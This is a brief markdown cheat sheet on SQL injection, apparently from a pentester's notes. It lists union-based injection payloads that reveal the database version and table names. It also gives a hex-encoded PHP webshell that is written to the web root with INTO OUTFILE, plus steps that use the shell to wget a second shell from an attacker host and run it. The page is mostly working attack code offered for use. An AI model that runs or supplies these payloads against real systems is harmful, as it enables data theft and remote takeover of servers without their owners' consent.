---
title: SQLi 💉
---
## Union based

```sql
' union select 1, @@version-- -
' union select 1, table_name FROM information_schema.tables-- -
```

## Upload webshell

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";?>` traduces in `0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E` in hex format:

```sql
' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3C3F706870206563686F20223C7072653E22202E207368656C6C5F6578656328245F4745545B22636D64225D29202E20223C2F7072653E223B3F3E-- -
```

- If you get an error, the query has been executed correctly. Now check `/shell.php`
- Now, to gain a full shell, you can just upload one and then calling it like:
	- Create the shell (check [reverse_shells](reverse_shells.md))
	- Create python web server
	- Download it from the browser: `http://domain.com/shell.php?cmd=wget http://IP_ATTACK:PORT/sexyshell.php`
	- Call it: `http://domain.com/sexyshell.php`